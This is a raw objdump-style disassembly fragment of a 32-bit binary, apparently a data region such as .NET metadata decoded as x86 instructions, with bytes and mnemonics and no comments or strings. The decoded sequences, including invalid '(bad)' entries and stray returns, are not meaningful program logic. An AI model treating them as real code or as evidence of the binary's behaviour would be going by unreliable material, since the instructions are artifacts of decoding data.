  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	d0 14 64             	rclb   $1,(%esp,%eiz,2)
  4069d9:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	07                   	pop    %es
  4069e5:	15 0e 00 5c 00       	adc    $0x5c000e,%eax
  4069ea:	20 55 00             	and    %dl,0x0(%ebp)
  4069ed:	00 00                	add    %al,(%eax)
  4069ef:	00 96 00 46 0c b1    	add    %dl,-0x4ef3ba00(%esi)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 46 0c             	add    %al,0xc(%esi)
  406a02:	b8 02 5e 00 44       	mov    $0x44005e02,%eax
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 46 0c             	add    %al,0xc(%esi)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 07 15 0e    	add    %al,0xe150718(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 47 0f             	add    %al,0xf(%edi)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 60 0c             	add    %ah,0xc(%eax)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 3c 1d d2 02 64 00 	add    %bh,0x6402d2(,%ebx,1)
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 dd                	add    %bl,%ch
  406a55:	18 da                	sbb    %bl,%dl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 2e                	add    %ch,(%esi)
  406a63:	06                   	push   %es
  406a64:	e1 02                	loope  0x406a68
  406a66:	68 00 e6 25 00       	push   $0x25e600
  406a6b:	00 00                	add    %al,(%eax)
  406a6d:	00 96 00 6a 10 e8    	add    %dl,-0x17ef9600(%esi)
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 aa 00 ef 02 6c    	add    %ch,0x6c02ef00(%edx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 aa 13 f6 02 6e    	add    %ch,0x6e02f613(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	07                   	pop    %es
  406a9b:	15 0e 00 70 00       	adc    $0x70000e,%eax
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 6d 18             	add    %ch,0x18(%ebp)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 64 18 84          	add    %ah,-0x7c(%eax,%ebx,1)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	ca 0a 00             	lret   $0xa
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 ca                	add    %cl,%dl
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 ca                	add    %cl,%dl
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 ca                	add    %cl,%dl
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 ca                	add    %cl,%dl
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 ca                	add    %cl,%dl
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 ca                	add    %cl,%dl
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 ca                	add    %cl,%dl
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 ca                	add    %cl,%dl
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 ca                	add    %cl,%dl
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 ab 07 00 00 01    	add    %ch,0x1000007(%ebx)
  406b01:	00 54 13 00          	add    %dl,0x0(%ebx,%edx,1)
  406b05:	00 02                	add    %al,(%edx)
  406b07:	00 b0 08 00 00 03    	add    %dh,0x3000008(%eax)
  406b0d:	00 b2 10 00 00 04    	add    %dh,0x4000010(%edx)
  406b13:	00 24 18             	add    %ah,(%eax,%ebx,1)
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	d4 12                	aam    $0x12
  406b1c:	00 00                	add    %al,(%eax)
  406b1e:	01 00                	add    %eax,(%eax)
  406b20:	1b 0d 00 00 01 00    	sbb    0x10000,%ecx
  406b26:	c1 0d 00 00 01 00 c1 	rorl   $0xc1,0x10000
  406b2d:	0d 00 00 01 00       	or     $0x10000,%eax
  406b32:	2b 0d 00 00 01 00    	sub    0x10000,%ecx
  406b38:	d6                   	salc
  406b39:	18 00                	sbb    %al,(%eax)
  406b3b:	00 01                	add    %al,(%ecx)
  406b3d:	00 c8                	add    %cl,%al
  406b3f:	04 00                	add    $0x0,%al
  406b41:	00 02                	add    %al,(%edx)
  406b43:	00 ff                	add    %bh,%bh
  406b45:	1b 00                	sbb    (%eax),%eax
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 64 1b 00          	add    %ah,0x0(%ebx,%ebx,1)
  406b4d:	00 01                	add    %al,(%ecx)
  406b4f:	00 33                	add    %dh,(%ebx)
  406b51:	07                   	pop    %es
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	3f                   	aas
  406b57:	18 00                	sbb    %al,(%eax)
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 22                	add    %ah,(%edx)
  406b5d:	1b 00                	sbb    (%eax),%eax
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 fd                	add    %bh,%ch
  406b63:	16                   	push   %ss
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	3e 00 00             	add    %al,%ds:(%eax)
  406b6b:	00 02                	add    %al,(%edx)
  406b6d:	00 a4 00 00 00 03 00 	add    %ah,0x30000(%eax,%eax,1)
  406b74:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b75:	00 00                	add    %al,(%eax)
  406b77:	00 01                	add    %al,(%ecx)
  406b79:	00 54 13 00          	add    %dl,0x0(%ebx,%edx,1)
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 6d 0b             	add    %ch,0xb(%ebp)
  406b82:	00 00                	add    %al,(%eax)
  406b84:	01 00                	add    %eax,(%eax)
  406b86:	ab                   	stos   %eax,%es:(%edi)
  406b87:	07                   	pop    %es
  406b88:	00 00                	add    %al,(%eax)
  406b8a:	02 00                	add    (%eax),%al
  406b8c:	ca 0a 00             	lret   $0xa
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 ca                	add    %cl,%dl
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 ab 07 00 00 01    	add    %ch,0x1000007(%ebx)
  406b9d:	00 bc 02 00 00 01 00 	add    %bh,0x10000(%edx,%eax,1)
  406ba4:	28 0e                	sub    %cl,(%esi)
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	47                   	inc    %edi
  406bab:	1c 00                	sbb    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 e3                	add    %ah,%bl
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bbb:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bc1:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bc7:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bcd:	00 3b                	add    %bh,(%ebx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 90 00 00 00 01    	add    %dl,0x1000000(%eax)
  406bd9:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406bdf:	00 b7 1b 00 00 01    	add    %dh,0x100001b(%edi)
  406be5:	00 c1                	add    %al,%cl
  406be7:	18 00                	sbb    %al,(%eax)
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 51 16             	add    %dl,0x16(%ecx)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	cd 16                	int    $0x16
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	cd 16                	int    $0x16
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	04 1c                	add    $0x1c,%al
  406c00:	00 00                	add    %al,(%eax)
  406c02:	01 00                	add    %eax,(%eax)
  406c04:	04 1c                	add    $0x1c,%al
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	04 1c                	add    $0x1c,%al
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	04 1c                	add    $0x1c,%al
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	04 1c                	add    $0x1c,%al
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	01 00                	add    %eax,(%eax)
  406c1c:	c1 0d 00 00 01 00 ae 	rorl   $0xae,0x10000
  406c23:	0d 00 00 02 00       	or     $0x20000,%eax
  406c28:	b9 0d 00 00 01       	mov    $0x100000d,%ecx
  406c2d:	00 ca                	add    %cl,%dl
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 ca                	add    %cl,%dl
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 ca                	add    %cl,%dl
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 2d 1c 00 00 01    	add    %ch,0x100001c
  406c45:	00 ca                	add    %cl,%dl
  406c47:	0a 00                	or     (%eax),%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 ab 07 00 00 01    	add    %ch,0x1000007(%ebx)
  406c51:	00 ab 07 00 00 01    	add    %ch,0x1000007(%ebx)
  406c57:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406c5d:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406c63:	00 ca                	add    %cl,%dl
  406c65:	0a 00                	or     (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 ca                	add    %cl,%dl
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 ca                	add    %cl,%dl
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 fa                	add    %bh,%dl
  406c77:	1c 00                	sbb    $0x0,%al
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 ca                	add    %cl,%dl
  406c7d:	0a 00                	or     (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 fa                	add    %bh,%dl
  406c83:	1c 00                	sbb    $0x0,%al
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 ca                	add    %cl,%dl
  406c89:	0a 00                	or     (%eax),%al
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 2a                	add    %ch,(%edx)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	2a 07                	sub    (%edi),%al
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	6d                   	insl   (%dx),%es:(%edi)
  406c9b:	0d 00 00 01 00       	or     $0x10000,%eax
  406ca0:	ca 0a 00             	lret   $0xa
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 6e 0e             	add    %ch,0xe(%esi)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	73 0e                	jae    0x406cbc
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	73 0e                	jae    0x406cc2
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	cd 16                	int    $0x16
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	2a 07                	sub    (%edi),%al
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	be 17 00 00 01       	mov    $0x1000017,%esi
  406cc9:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406ccf:	00 ca                	add    %cl,%dl
  406cd1:	0a 00                	or     (%eax),%al
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 ca                	add    %cl,%dl
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 ca                	add    %cl,%dl
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 be 17 00 00 02    	add    %bh,0x2000017(%esi)
  406ce7:	00 96 10 00 00 01    	add    %dl,0x1000010(%esi)
  406ced:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406cf3:	00 77 0b             	add    %dh,0xb(%edi)
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	be 17 00 00 01       	mov    $0x1000017,%esi
  406cff:	00 be 17 00 00 01    	add    %bh,0x1000017(%esi)
  406d05:	00 be 17 00 00 02    	add    %bh,0x2000017(%esi)
  406d0b:	00 7d 0e             	add    %bh,0xe(%ebp)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d17:	00 c4                	add    %al,%ah
  406d19:	16                   	push   %ss
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d23:	00 73 0e             	add    %dh,0xe(%ebx)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d2f:	00 73 0e             	add    %dh,0xe(%ebx)
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d3b:	00 6e 0e             	add    %ch,0xe(%esi)
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d47:	00 78 0e             	add    %bh,0xe(%eax)
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	be 17 00 00 02       	mov    $0x2000017,%esi
  406d53:	00 78 0e             	add    %bh,0xe(%eax)
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	b7 1b                	mov    $0x1b,%bh
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	01 00                	add    %eax,(%eax)
  406d60:	b7 1b                	mov    $0x1b,%bh
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 f0 1a bb    	add    %dh,-0x44e51000(%ecx)
  406d6f:	01 b1 00 dc 1b bf    	add    %esi,-0x40e42400(%ecx)
  406d75:	01 b1 00 cb 19 0e    	add    %esi,0xe19cb00(%ecx)
  406d7b:	00 b9 00 ef 14 64    	add    %bh,0x6414ef00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 07                	add    %al,(%edi)
  406d85:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d8a:	07                   	pop    %es
  406d8b:	15 0e 00 d9 00       	adc    $0xd9000e,%eax
  406d90:	07                   	pop    %es
  406d91:	15 2e 03 e9 00       	adc    $0xe9032e,%eax
  406d96:	07                   	pop    %es
  406d97:	15 6b 01 f1 00       	adc    $0xf1016b,%eax
  406d9c:	07                   	pop    %es
  406d9d:	15 6b 01 f9 00       	adc    $0xf9016b,%eax
  406da2:	07                   	pop    %es
  406da3:	15 6b 01 01 01       	adc    $0x101016b,%eax
  406da8:	07                   	pop    %es
  406da9:	15 6b 01 09 01       	adc    $0x109016b,%eax
  406dae:	07                   	pop    %es
  406daf:	15 6b 01 11 01       	adc    $0x111016b,%eax
  406db4:	07                   	pop    %es
  406db5:	15 6b 01 19 01       	adc    $0x119016b,%eax
  406dba:	07                   	pop    %es
  406dbb:	15 6b 01 21 01       	adc    $0x121016b,%eax
  406dc0:	07                   	pop    %es
  406dc1:	15 6b 01 29 01       	adc    $0x129016b,%eax
  406dc6:	07                   	pop    %es
  406dc7:	15 6b 01 31 01       	adc    $0x131016b,%eax
  406dcc:	07                   	pop    %es
  406dcd:	15 4b 02 39 01       	adc    $0x139024b,%eax
  406dd2:	07                   	pop    %es
  406dd3:	15 0e 00 41 01       	adc    $0x141000e,%eax
  406dd8:	07                   	pop    %es
  406dd9:	15 6b 01 49 01       	adc    $0x149016b,%eax
  406dde:	86 12                	xchg   %dl,(%edx)
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 77 00             	add    %esi,0x0(%edi)
  406de6:	c4 03                	les    (%ebx),%eax
  406de8:	59                   	pop    %ecx
  406de9:	01 f5                	add    %esi,%ebp
  406deb:	19 7f 00             	sbb    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 77 10             	add    %esi,0x10(%edi)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	07                   	pop    %es
  406df7:	15 0e 00 61 01       	adc    $0x161000e,%eax
  406dfc:	40                   	inc    %eax
  406dfd:	01 cd                	add    %ecx,%ebp
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	26 0c 2a             	es or  $0x2a,%al
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	b5 0c                	mov    $0xc,%ch
  406e0a:	d3 03                	roll   %cl,(%ebx)
  406e0c:	11 00                	adc    %eax,(%eax)
  406e0e:	07                   	pop    %es
  406e0f:	15 2b 02 11 00       	adc    $0x11022b,%eax
  406e14:	cc                   	int3
  406e15:	1c d9                	sbb    $0xd9,%al
  406e17:	03 69 01             	add    0x1(%ecx),%ebp
  406e1a:	97                   	xchg   %eax,%edi
  406e1b:	1c df                	sbb    $0xdf,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	bb 16 e5 03 81       	mov    $0x8103e516,%ebx
  406e25:	01 eb                	add    %ebp,%ebx
  406e27:	01 c7                	add    %eax,%edi
  406e29:	00 79 01             	add    %bh,0x1(%ecx)
  406e2c:	3d 0d eb 03 19       	cmp    $0x1903eb0d,%eax
  406e31:	00 07                	add    %al,(%edi)
  406e33:	15 09 04 19 00       	adc    $0x190409,%eax
  406e38:	4d                   	dec    %ebp
  406e39:	0b 01                	or     (%ecx),%eax
  406e3b:	03 19                	add    (%ecx),%ebx
  406e3d:	00 3a                	add    %bh,(%edx)
  406e3f:	0b 01                	or     (%ecx),%eax
  406e41:	03 c1                	add    %ecx,%eax
  406e43:	01 71 1d             	add    %esi,0x1d(%ecx)
  406e46:	16                   	push   %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 e7                	add    %esp,%edi
  406e4b:	19 1c 04             	sbb    %ebx,(%esp,%eax,1)
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	07                   	pop    %es
  406e51:	15 0e 00 d1 01       	adc    $0x1d1000e,%eax
  406e56:	e0 1b                	loopne 0x406e73
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 f8                	add    %edi,%eax
  406e5d:	15 28 04 19 00       	adc    $0x190428,%eax
  406e62:	4e                   	dec    %esi
  406e63:	19 30                	sbb    %esi,(%eax)
  406e65:	04 19                	add    $0x19,%al
  406e67:	00 3d 03 bf 01 19    	add    %bh,0x1901bf03
  406e6d:	00 4e 19             	add    %cl,0x19(%esi)
  406e70:	3c 02                	cmp    $0x2,%al
  406e72:	99                   	cltd
  406e73:	01 07                	add    %eax,(%edi)
  406e75:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e7a:	07                   	pop    %es
  406e7b:	15 36 02 99 01       	adc    $0x1990236,%eax
  406e80:	68 17 38 04 99       	push   $0x99043817
  406e85:	01 51 0c             	add    %edx,0xc(%ecx)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 e7             	roll   $0xe7,(%ecx)
  406e8d:	19 3f                	sbb    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 e0                	add    %esp,%eax
  406e93:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 6d 08             	add    %ebp,0x8(%ebp)
  406e9a:	0e                   	push   %cs
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 07                	add    %eax,(%edi)
  406e9f:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406ea4:	07                   	pop    %es
  406ea5:	15 56 04 21 00       	adc    $0x210456,%eax
  406eaa:	07                   	pop    %es
  406eab:	15 5c 04 19 00       	adc    $0x19045c,%eax
  406eb0:	34 1b                	xor    $0x1b,%al
  406eb2:	66 04 09             	data16 add $0x9,%al
  406eb5:	00 6c 0c 47          	add    %ch,0x47(%esp,%ecx,1)
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 70 1a             	add    %dh,0x1a(%eax)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 07                	add    (%edi),%al
  406ec3:	15 56 04 29 00       	adc    $0x290456,%eax
  406ec8:	07                   	pop    %es
  406ec9:	15 78 04 31 02       	adc    $0x2310478,%eax
  406ece:	07                   	pop    %es
  406ecf:	15 56 04 c1 00       	adc    $0xc10456,%eax
  406ed4:	10 03                	adc    %al,(%ebx)
  406ed6:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406eda:	9d                   	popf
  406edb:	07                   	pop    %es
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 78 17             	add    %bh,0x17(%eax)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 6d 08             	add    %ch,0x8(%ebp)
  406ee8:	0e                   	push   %cs
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 6d 08             	add    %ch,0x8(%ebp)
  406eee:	0e                   	push   %cs
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 6d 08             	add    %ch,0x8(%ebp)
  406ef4:	0e                   	push   %cs
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 08                	add    %cl,(%eax)
  406ef9:	03 a1 04 49 02 77    	add    0x77024904(%ecx),%esp
  406eff:	00 a7 04 c1 00 15    	add    %ah,0x1500c104(%edi)
  406f05:	03 ae 04 51 02 07    	add    0x7025104(%esi),%ebp
  406f0b:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f10:	07                   	pop    %es
  406f11:	15 b6 04 49 01       	adc    $0x14904b6,%eax
  406f16:	99                   	cltd
  406f17:	1b bd 04 61 02 88    	sbb    -0x77fd9efc(%ebp),%edi
  406f1d:	14 cf                	adc    $0xcf,%al
  406f1f:	04 49                	add    $0x49,%al
  406f21:	02 bb 16 9f 01 19    	add    0x19019f16(%ebx),%bh
  406f27:	00 42 0f             	add    %al,0xf(%edx)
  406f2a:	d6                   	salc
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 eb                	add    %ch,%bl
  406f2f:	08 de                	or     %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 07                	add    (%edi),%al
  406f35:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f3a:	ae                   	scas   %es:(%edi),%al
  406f3b:	11 15 02 c1 00 48    	adc    %edx,0x4800c102
  406f41:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f46:	f5                   	cmc
  406f47:	19 9a 00 71 02 46    	sbb    %ebx,0x46027100(%edx)
  406f4d:	19 0a                	sbb    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	d0 15 c7 00 a1 02    	rclb   $1,0x2a100c7
  406f58:	e5 07                	in     $0x7,%eax
  406f5a:	01 05 79 02 07 15    	add    %eax,0x15070279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 48 18             	add    0x18(%eax),%cl
  406f66:	07                   	pop    %es
  406f67:	05 81 02 ab 06       	add    $0x6ab0281,%eax
  406f6c:	0d 05 a9 02 f4       	or     $0xf402a905,%eax
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 5f 07 47    	add    0x47075f02(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 7d 1d             	add    %edi,0x1d(%ebp)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 eb                	add    %bl,%ch
  406f83:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f88:	3d 0f 0e 00 89       	cmp    $0x89000e0f,%eax
  406f8d:	02 07                	add    (%edi),%al
  406f8f:	15 0e 00 89 02       	adc    $0x289000e,%eax
  406f94:	01 07                	add    %eax,(%edi)
  406f96:	6b 01 b1             	imul   $0xffffffb1,(%ecx),%eax
  406f99:	02 eb                	add    %bl,%ch
  406f9b:	06                   	push   %es
  406f9c:	47                   	inc    %edi
  406f9d:	02 a1 02 ea 10 c7    	add    -0x38ef15fe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 c3                	add    %eax,%ebx
  406fa7:	18 1a                	sbb    %bl,(%edx)
  406fa9:	05 89 02 8b 18       	add    $0x188b0289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 c8                	add    %al,%cl
  406fb3:	06                   	push   %es
  406fb4:	20 05 89 02 1a 1c    	and    %al,0x1c1a0289
  406fba:	4b                   	dec    %ebx
  406fbb:	02 81 02 99 1b 27    	add    0x271b9902(%ecx),%al
  406fc1:	05 c1 02 64 14       	add    $0x146402c1,%eax
  406fc6:	30 05 c9 02 7b 08    	xor    %al,0x87b02c9
  406fcc:	c7 00 91 02 c1 1c    	movl   $0x1cc10291,(%eax)
  406fd2:	35 05 c1 01 c3       	xor    $0xc301c105,%eax
  406fd7:	18 3f                	sbb    %bh,(%edi)
  406fd9:	05 91 02 c1 0a       	add    $0xac10291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 ac 18       	add    $0x18ac02d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	db 08                	fisttpl (%eax)
  406fea:	3e 01 e1             	ds add %esp,%ecx
  406fed:	02 07                	add    (%edi),%al
  406fef:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
